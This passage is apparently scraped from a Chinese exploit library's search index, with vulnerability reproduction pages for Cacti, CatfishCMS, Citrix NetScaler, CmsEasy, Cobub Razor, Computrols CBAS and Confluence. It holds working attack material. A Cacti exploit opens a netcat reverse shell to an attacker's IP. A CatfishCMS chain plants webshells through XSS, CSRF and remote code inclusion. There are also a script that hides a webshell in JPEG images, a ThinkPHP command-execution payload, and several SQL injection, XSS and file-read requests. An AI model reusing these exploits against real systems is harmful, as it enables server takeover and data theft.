print(\"[~] Usage : ./Cacti-exploit.py url ip port\") exit() url = sys.argv[1] ip = sys.argv[2] port = sys.argv[3] def send_exploit(url): payload = \";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s\" % (ip, port) cookies = {'Cacti': quote(payload)} path = url+\"/graph_realtime.php?action=init\" req = requests.get(path) if req.status_code == 200 and \"poller_realtime.php\" in req.text: print(\"[+] File Found and Guest is enabled!\") print(\"[+] Sending malicous request, check your nc ;)\") requests.get(path, cookies=cookies) else: print(\"[+] Error while requesting the file!\") send_exploit(url) 如我们所见，如果启用了“ Gest Realtime Graphs”特权，我们也可以毫无问题地利用它，因此最好检查“ graph_realtime.php”文件是否具有此访问特权。 参考链接 https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-23 16:24:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/2.html":{"url":"0day/CatfishCMS/2.html","title":"CatfishCMS后台csrf","keywords":"","body":"CatfishCMS后台csrf 一、漏洞简介 二、漏洞影响 三、复现过程 首先需要登录后台 history.pushState('', '', '/') 修改前 修改后 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-28 23:21:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/1.html":{"url":"0day/CatfishCMS/1.html","title":"CatfishCMS后台储存型xss","keywords":"","body":"CatfishCMS后台储存型xss 一、漏洞简介 网站背景中的管理员可以发布包含存储XSS漏洞的文章 提交标题以抓取数据包 使用burp修改参数 浏览文章可以触发XSS 二、漏洞影响 三、复现过程 neiron= 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-28 23:17:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/6.html":{"url":"0day/CatfishCMS/6.html","title":"CatfishCMS 4.5.7 xss","keywords":"","body":"CatfishCMS 4.5.7 xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 漏洞分析 文件：application\\config.php 参数：default_filter 最后找到一处未过滤的地方 文件：application/index/controller/Index.php 方法：pinglun() 过滤函数 文件：application\\index\\controller\\Common.php 方法：filterJs() 可以看到只是简单的过滤很简单就可以绕过 复现 自己在此cms注册一个账号然后随便点击一篇文章 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 20:23:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/7.html":{"url":"0day/CatfishCMS/7.html","title":"CatfishCMS 4.5.7 csrf getshell","keywords":"","body":"CatfishCMS 4.5.7 csrf getshell 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 思路： 前台评论出插入xss代码->诱骗后台管理员访问网站-内容管理-评论管理-自动执行xss代码->通过csrf插入一条新文章->通过csrf清除缓存->在通过js访问前端任意页面生成缓存建立shell 大概的想法就是这样做了。 后台创建文章方法 地址：application\\admin\\controller\\Index.php 方法：write(); 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 后台清除缓存方法 地址：application\\admin\\controller\\Index.php 方法：clearcache() 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 例子： 1， 准备好脚本 2，利用前面的xss漏洞，配合这个脚本形成xsrf漏洞 这样我们在前端的事情就完事了。接着我们模拟后台管理员进入后台的操作 模拟的后端管理员操作： 漏洞原理与流程： 1,后台创建文章方法 地址：application\\admin\\controller\\Index.php 方法：write(); 这个方法没有什么可以讲只是单纯的从前端获取数据然后写入数据库罢了 2,后台清除缓存方法 地址：application\\admin\\controller\\Index.php 方法：clearcache() 这个方法没有什么可以讲的。只是单纯的删除缓存数据 3,访问前端重新生成缓存 地址： application\\index\\controller\\Index.php 方法：index() 缓存的名字由来 缓存的名字组成就是比较简单的了。 这上面几幅图就是缓存的名字了什么意思呢？很简单 首先是从index目录里面的index模块下面的index方法 调用了一个方法 $template = $this->receive('index'); = index 然后是ndex目录里面的Common模块里面的receive 方法 获取了变量$source 值 = index 获取了变量$page 值 = 1 Cache::set('hunhe_'.$source.$page,$hunhe,3600); 缓存方法 最后就是 MD5(hunhe_index1) = 9040ab6906a15768edcd9e5b1d57fcda 后记： 使用此方法的话，尝试一下在url中输入 http://www.xxxxxxx.com/runtime http://www.xxxxxxx.com/runtime/cache http://www.xxxxxxx.com/runtime/cache/8d6ab84ca2af9fccd4e4048694176ebf.php 按顺序输入如果前两个访问得到的结果是403 最后的结果不是403或是404 而是返回正常的页面，那么说明站点的缓存目录是可以访问的，这个时候可以使用此漏洞。配合xss+csrf 获取getshell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 20:30:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/3.html":{"url":"0day/CatfishCMS/3.html","title":"CatfishCMS 4.6.15 前台xss","keywords":"","body":"CatfishCMS 4.6.15 前台xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.6 三、复现过程 代码分析 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/index/Index/pinglun 文件：application/index/controller/Index.php 方法：pinglun( 文件：application\\index\\controller\\Common.php 过滤函数：filterJs() 漏洞复现 首先注册一个用户 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 00:34:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/4.html":{"url":"0day/CatfishCMS/4.html","title":"CatfishCMS 4.6.15 后台文件包含getshell","keywords":"","body":"CatfishCMS 4.6.15 后台文件包含getshell 一、漏洞简介 使用TP的模版函数进行文件包含 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞原理 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/admin/Index/newpage.html 文件地址：\\CatfishCMS-4.6.12\\application\\admin\\controller\\Index.php 函数：newpage() 复现 首先需要制作图片马 在正常图片中插入shell并无视GD图像库的处理，常规方法有两种 1. 对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行 2. 利用php-gd算法上的问题进行绕过 这里我们选择第二种，使用脚本进行处理图片并绕过 1. 上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg 2. 执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg 3. 如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句 提示： 1. 图片找的稍微大一点 成功率更高 2. shell语句越短成功率越高 3. 一张图片不行就换一张 不要死磕注：上面的字全部是抄的，先说明一下不然给人按在地上骂就不好了 制作过程： 图片马制作脚本 In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $a = '$_POST[eeeeeee]'; $miniPayload = \"\"; /*$miniPayload = \"\";*/ if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis->eof()) && ($dis->readByte() == 0xFF)) { $marker = $dis->readByte(); $size = $dis->readShort() - 2; $dis->skip($size); if($marker === 0xDA) { $startPos = $dis->seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis->eof())) { if($dis->readByte() === 0xFF) { if($dis->readByte !== 0x00) { break; } } } $stopPos = $dis->seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this->binData = ''; $this->order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this->binData = file_get_contents($filename); } else { $this->binData = $filename; } $this->size = strlen($this->binData); } public function seek() { return ($this->size - strlen($this->binData)); } public function skip($skip) { $this->binData = substr($this->binData, $skip); } public function readByte() { if($this->eof()) { die('End Of File'); } $byte = substr($this->binData, 0, 1); $this->binData = substr($this->binData, 1); return ord($byte); } public function readShort() { if(strlen($this->binData) binData, 0, 2); $this->binData = substr($this->binData, 2); if($this->order) { $short = (ord($short[1]) binData||(strlen($this->binData) === 0); } } ?> 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 14:59:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/5.html":{"url":"0day/CatfishCMS/5.html","title":"CatfishCMS 4.6.15 csrf getshell","keywords":"","body":"CatfishCMS 4.6.15 csrf getshell 一、漏洞简介 在测试的过程中发现更新版本的时候作者添加一个参数 verification 可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification 就显的苍白无力了，因为我们可以先获取 verification 然后在执行csrf 从而来绕过。 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞分析 文件：CatfishCMS-4.6.12\\catfish\\library\\think\\Template.php 函数：fetch() 嗯，说完了。Fetch方法最后都会编译文件以后通过PHP输出，所以如果我们可以在他编译之前写入 恶意代码 那么就可以为所欲为。 复现 前台注册一个账户->注册一个图片马到网站中->评论处插入xss代码->等待无辜管理员登录网站->获取 verification(绕过检测)->管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)->包含漏洞执行代码->包含漏洞添加getshell_code.php文件写入恶意代码->包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库->删除我们前面的评论->删除我们csrf创建的页面->邮件通知我们->getshell CatfishCMS-4.6.12-xss.js /* 需要插入的xss代码 ';$('body').append(xss_js);\"> */ //不用动的 var articles = 'index.php/admin/Index/articles.html';//用来获取 verification 绕过检测 var newpage = 'index.php/admin/Index/newpage.html';//生成文章地址 var allpage = 'index.php/admin/Index/allpage.html';//获取文章链接 //需要改的 var url = 'http://0-sec.org';//你要日的站的域名 var directory = '/cms/CatfishCMS-4.6.12/'; //日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写) var img_trojan_url = '../../../'+'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg';//图片马的地址 修改 + 号后面的即可 var getshell_code = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt';//恶意代码远程包含的地址 $('body').append(''); $('body').append(''); $.ajax({ url: url+directory+articles, dataType: \"json\", success: function(verification_content){ $('#csrf_verification').append(verification_content); var verification = $('#verification').html();//用来绕过验证的 // alert(verification); //csrf生成文章,引起文件包含漏洞 $.ajax({ type: \"POST\", url: url+directory+newpage, data: { 'biaoti':'xss_csrf_getshll', 'template':img_trojan_url, 'verification':verification, 'fabushijian':'2017-12-05 11:56:48' }, success: function(){ //csrf获取shell链接 $.ajax({ type: \"POST\", url: url+directory+allpage, success: function(allpage_content){ $('#csrf_allpage').append(allpage_content); var shell_id = $('#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan').eq(0).val(); var shell_url = $('#csrf_allpage .table-responsive .table-bordered tbody tr td a').eq(0).attr('href'); var shell_content = ''; shell_content+= \"$myfile = fopen('getshell_code.php', 'w');\"; shell_content+= '$txt = '+'file_get_contents(\"'+getshell_code+'\");'; shell_content+= 'fwrite($myfile, $txt);'; console.log(shell_content); //执行shell 生成马子 $.ajax({ type: \"POST\", url: url+shell_url, dataType: \"json\", data: {'ddd':shell_content}, success: function(data){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); }, error: function(){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); } }); } }); } }); } }); 写好以后模拟管理员，进入后台 getshell_code query($sql); $pdo->query($sql_1); unlink('getshell_code.php'); } ?> 连接马子的操作，这个文件会在index.php中给引入所以直接 http://0-sec.org/index.php POST ddd = 你要执行的命令 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-10 15:26:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/CatfishCMS远程命令执行.html":{"url":"0day/CatfishCMS/CatfishCMS远程命令执行.html","title":"（CNVD-2019-06255）CatfishCMS远程命令执行","keywords":"","body":"（CNVD-2019-06255）CatfishCMS远程命令执行 一、漏洞简介 二、漏洞影响 v4.8.54 三、复现过程 1、_method=__construct CatfishCMS基于thinkPHP5开发。 Request类（catfish/library/think/Request.php）用于处理请求。 它的成员函数method用于获取请求的类型。 application/config.php 中定义了“表单请求类型伪装变量”: POST请求参数 “ _method=construct ”，将 construct 传给了var_method ，在Request类的method函数中执行后，实现了对Request类的 __construct 构造函数的调用；并且将完整的POST参数传给了构造函数。 2、method=*&filter[]=system catfish/library/think/Request.php模块中的Request类的构造函数： 中存在的参数，就取用户传入的值为其赋值。 _method=construct 使得 method 函数调用了 construct 构造函数， 并且将完整的POST参数传递过去。实现了对本类中的 $method 和 $filter 两个全局变量的覆盖。 filter[]=system 的补充说明： filter[]=system 或者 filter=system都可以，[]符号可有可无；system意为执行系统命令。 Method=* 的补充说明： method参数的取值限定为：catfish/library/think/Route.php 模块中定义的路由规则。如：GET、POST、PUT、* 等任何一个值都可以；如果值不在此表或为空，都会报错。 3、s=dir application/config.php 中定义PATHINFO变量名为’ s ’。可用s传入需要执行的命令，如s=dir 最终的的payload： s=dir&_method=__construct&method=*&filter[]=system _method=construct 使得 Request类的method函数调用 construct 构造函数，并且将完整的payload传递给构造函数；构造函数中对 method 和filter 两个全局变量进行覆盖，method=&filter[]=system ；参数s=dir传入需要执行的系统命令 dir 。 s=echo \"shell\" >shell.php&filter[]=system&method=*&_method=__construct 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 15:45:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Citrix NetScaler/CVE-2019-19781.html":{"url":"0day/Citrix NetScaler/CVE-2019-19781.html","title":"（CVE-2019-19781）Citrix ADC&NetScaler 远程命令执行漏洞","keywords":"","body":"（CVE-2019-19781）Citrix ADC&NetScaler 远程命令执行漏洞 一、漏洞简介 二、漏洞影响 13.x,12.1,12.0,11.1,10.5 三、复现过程 https://github.com/ianxtianxt/CVE-2019-19781 0x01 upload_xml (/vpn/../vpns/portal/scripts/newbm.pl) 0x02 Execute Command (/vpn/../vpns/portal/jas502n.xml) Payload: url=http://example.com&title=c&desc=[% http://template.new('BLOCK' = 'print `cat /etc/passwd`') %] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-11 15:21:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CmsEasy/1.html":{"url":"0day/CmsEasy/1.html","title":" CmsEasy 7.3.8 任意文件操作 ","keywords":"","body":"CmsEasy 7.3.8 任意文件操作 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 “无需代码，自由拖拽布局，适应所有设备”是这个系统宣传的特色，后台自然地存在自定义网站模板功能，这种功能中如果处理不当很可能造成文件任意读、写或者删除的脆弱性问题，需要着重注意。 观察模板编辑功能，存在对模板的html文件的读取操作，对应到HTTP请求可以明显看到可控参数 看到功能不急着看代码，首先想到黑盒测试一下，手动修改id参数后观察发现可以这个接口果然没有做好限制和过滤，可以读取任意传参文件 观察接口URL中的参数，猜测除了fetch之外应该还有保存和删除的功能，但是功能接口的接收参数就不知道了，因此需要去看源码以进行下一步操作 定位到接口的功能函数文件后，发现经过了加密混淆处理。。。 经过一番操作后，最终得到了文件删除的接口函数大致内容，很明显地存在文件删除路径可控问题 同理，文件写也存在问题，这里就不详细列出了，感兴趣的朋友可以再看看 参考链接 https://xz.aliyun.com/t/7273 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 13:37:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CmsEasy/2.html":{"url":"0day/CmsEasy/2.html","title":" CmsEasy 7.3.8 sql注入漏洞 ","keywords":"","body":"CmsEasy 7.3.8 sql注入漏洞 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 漏洞代码位于lib/admin/language_admin.php的add_action函数 在测试后发现CmsEasy V7.3.8框架已经对SQLi进行了转义和过滤，包括（select、* 、sleep等等），为了确定具体的过滤名单，从源码中查找检测函数 但是经过一番搜索后，源码中发现实际调用的注入检测函数并没有被定义，仔细研究后确定是在几个加密混淆的核心代码中实现了。。（闭源一定意味着安全吗？）——通过一番周折后得到函数 显而易见，这样简单的过滤很容易被部分SQLi关键组成字符绕过，导致SQL注入，例如，可以使用benchmark函数来代替sleep以达到基于时间的注入。除了通过得到源码来明确黑名单的，用fuzz同样可以得到过滤的黑名单，之后再想办法绕过 而类似的漏洞成因在同一个文件的edit_action函数中也存在 这两处接口都存在SQL注入漏洞，提交的payload绕过过滤黑名单后可以进行利用 参考链接 https://xz.aliyun.com/t/7273 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 13:38:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CmsEasy/3.html":{"url":"0day/CmsEasy/3.html","title":" CmsEasy 7.3.8 本地文件包含漏洞 ","keywords":"","body":"CmsEasy 7.3.8 本地文件包含漏洞 一、漏洞简介 二、漏洞影响 CmsEasy 7.3.8 三、复现过程 CmsEasy V7.3.8框架后端的语言编辑功能函数接口对include的文件路径没有做安全性校验，攻击者可以通过该接口包含上传的带有PHP代码内容的任意后缀（合法）文件，导致远程代码执行 漏洞代码位置是位于CmsEasy_7.3.8_UTF-8_20191230/lib/admin/language_admin.php文件中的edit_action函数 $lang_choice是从用户的GET请求参数中直接获取的，$langurlname是从数据库中获取的langurlname字段。后面将这两个参数直接拼接路劲赋值给$path，这里的$lang_choice拼接在最后，可以任意赋值（为后面文件包含导致命令执行奠定基础）。 接着由于266行判断POST参数是否有submit，我们可以直接不传这个参数来绕开这一段的代码执行，到299行直接通过inlcude函数包含我们任意传递的值，导致文件包含 CmsEasy对于任何用户存在文件和图片上传功能，虽然我们不能直接上传php文件（默认禁止），但是可以上传内容为php代码的图片后缀文件，因此可以通过这一处文件包含达到最后高危的命令执行问题 参考链接 https://xz.aliyun.com/t/7273 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 13:38:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Cobub Razor/CVE-2018-7720.html":{"url":"0day/Cobub Razor/CVE-2018-7720.html","title":"（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞","keywords":"","body":"（CVE-2018-7720）Cobub Razor 0.7.2 存在跨站请求伪造漏洞 一、漏洞简介 Cobub Razor 0.7.2存在跨站请求伪造漏洞，管理员登陆后访问特定页面可增加管理员账号。保存如下利用代码为html页面，打开页面将增加test123/test的管理员账号。 二、漏洞影响 Cobub Razor 0.7.2 三、复现过程 POC alert(document.cookie) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:41:13 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Cobub Razor/CVE-2018-7745.html":{"url":"0day/Cobub Razor/CVE-2018-7745.html","title":"（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户","keywords":"","body":"（CVE-2018-7745）Cobub Razor 0.7.2 越权增加管理员账户 一、漏洞简介 Cobub Razor 0.7.2越权增加管理员账户漏洞，在不登录的情况下发送特定数据包，可新增管理员账号。保存如下利用代码为html页面，打开页面将增加test/test123的管理员账号，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Cobub Razor 0.7.2 三、复现过程 POC history.pushState('', '', '/') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:41:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Cobub Razor/1.html":{"url":"0day/Cobub Razor/1.html","title":"（CVE-2018-8056/CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞","keywords":"","body":"（CVE-2018-8056/CVE-2018-8770）Cobub Razor 0.8.0 存在物理路径泄露漏洞 一、漏洞简介 二、漏洞影响 Cobub Razor 0.8.0 三、复现过程 POC 方法一： URL: http://localhost/export.php HTTP Method: GET URL: http://localhost/index.php?/manage/channel/addchannel HTTP Method: POST Data: channel_name=test\"&platform=1 方法二： Cobub Razor 0.8.0存在物理路径泄露漏洞，当访问特定url时，系统会显示物理路径信息。Cobub Razor是一个在github上开源的系统。 HTTP Method: GET http://localhost/tests/generate.php http://localhost/tests/controllers/getConfigTest.php http://localhost/tests/controllers/getUpdateTest.php http://localhost/tests/controllers/postclientdataTest.php http://localhost/tests/controllers/posterrorTest.php http://localhost/tests/controllers/posteventTest.php http://localhost/tests/controllers/posttagTest.php http://localhost/tests/controllers/postusinglogTest.php http://localhost/tests/fixtures/Controller_fixt.php http://localhost/tests/fixtures/Controller_fixt2.php http://localhost/tests/fixtures/view_fixt2.php http://localhost/tests/libs/ipTest.php http://localhost/tests/models/commonDbfix.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:41:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Cobub Razor/CVE-2018-8057.html":{"url":"0day/Cobub Razor/CVE-2018-8057.html","title":"（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞","keywords":"","body":"（CVE-2018-8057）Cobub Razor 0.8.0 存在SQL注入漏洞 一、漏洞简介 Cobub Razor 0.8.0存在SQL注入漏洞，“/application/controllers/manage/channel.php”页面的“channel_name”及“platform”参数过滤不严格导致存在SQL注入漏洞。Cobub Razor是一个在github上开源的系统，漏洞发现者已经将漏洞信息通过issues告知作者。 二、漏洞影响 Cobub Razor 0.8.0 三、复现过程 POC > http://www.0-sec.org/index.php?/manage/channel/addchannel > POST data: > 1.channel_name=test\" AND (SELECT 1700 FROM(SELECT COUNT(*),CONCAT(0x7171706b71,(SELECT (ELT(1700=1700,1))),0x71786a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- JQon&platform=1 > 2.channel_name=test\" AND SLEEP(5)-- NklJ&platform=1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:41:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/1.html":{"url":"0day/Computrols CBAS Web/1.html","title":"（CVE-2019-10846）Computrols CBAS Web反射型xss","keywords":"","body":"（CVE-2019-10846）Computrols CBAS Web反射型xss 一、漏洞简介 Computrols CBAS Web是美国Computrols公司的一套楼宇自动化系统 二、漏洞影响 Computrols CBAS Web 三、复现过程 1、 POST /cbas/index.php?m=auth&a=verifyid HTTP/1.1 username=\">confirm(document.cookie)&submit_button=Send+Me+a+New+Password+Via+Email 2、 POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=\">htmlinjection&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 3、 GET /cbas/index.php?m=auth&a=login&username=\">my milkshake brings all the boys to the yard.&password=damn_right HTTP/1.1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-14 00:40:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/3.html":{"url":"0day/Computrols CBAS Web/3.html","title":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举","keywords":"","body":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举 一、漏洞简介 二、漏洞影响 19.0.0及以下 三、复现过程 测试无效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 Response randomuser 测试有效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=admin&password=&challenge=6e4344e7ac62520dba82d7f20ccbd422&response=e09aab669572a8e4576206d5c14befc5s Response Invalid username/password combination. Please try again! 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-14 00:51:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/2.html":{"url":"0day/Computrols CBAS Web/2.html","title":"（CVE-2019-10852）Computrols CBAS Web SQL注入","keywords":"","body":"（CVE-2019-10852）Computrols CBAS Web SQL注入 一、漏洞简介 Computrols CBAS-Web经过身份验证的基于布尔的盲SQL注入 二、漏洞影响 19.0.0及以下 三、复现过程 http://www.0-sec.org/cbas/index.php?m=servers&a=start_pulling&id=1 AND 2510 = 2510 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-14 00:47:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Confluence/2.html":{"url":"0day/Confluence/2.html","title":"（CVE-2019-3394）Confluence 文件读取漏洞","keywords":"","body":"（CVE-2019-3394）Confluence 文件读取漏洞 一、漏洞简介 （CVE-2019-3394）Confluence 文件读取漏洞 二、影响范围 6.1.0 6.7.0 6.14.0 三、复现过程 poc POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 Content-Length: 175 Accept: text/plain, */*; q=0.01 Origin: http://localhost:8090 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Content-Type: application/json; charset=UTF-8 Referer: http://localhost:8090/ Connection: close {\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\": {\"url\":\"https://www.viddler.com/v/test\",\"width\":\"1000\",\"height\":\"1000\",\"_templat e\":\"file:///C:/Windows/win.ini\"},\"body\":\"\"}} 触发条件 一个有效的登录账号 该账号具有在空间「添加页面」的权限 复现步骤 1.创建一个空白页 2.插入一张网络图片 插入url改为你需要查看的文件，例如 /packages/../web.xml 3.点击发布，抓取报文 4.删除多余url前缀,只留下 /packages/../web.xml 并放开报文 5.查看页面源码确认修改成功 6.导出word，并抓包查看 路径说明 由于 catalina.jar中的 org.apache.catalina.webresources.StandardRoot.class的 getResource方法的 validate存在过滤和限制，所以可遍历路径均在 /WEB-INF下 可读取的文件大致如下 #WEB-INF下 decorators.xml glue-config.xml server-config.wsdd sitemesh.xml urlrewrite.xml web.xml #/WEB-INF/classes下 confluence-filtered-frames.properties confluence-init.properties crowd.properties(较为重要) hash-registry.properties lgplTemplate.soy log4j-diagnostic.properties log4j.properties logging.properties mime.types osuser.xml seraph-config.xml seraph-paths.xml velocity_implicit.vm velocity.properties 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && 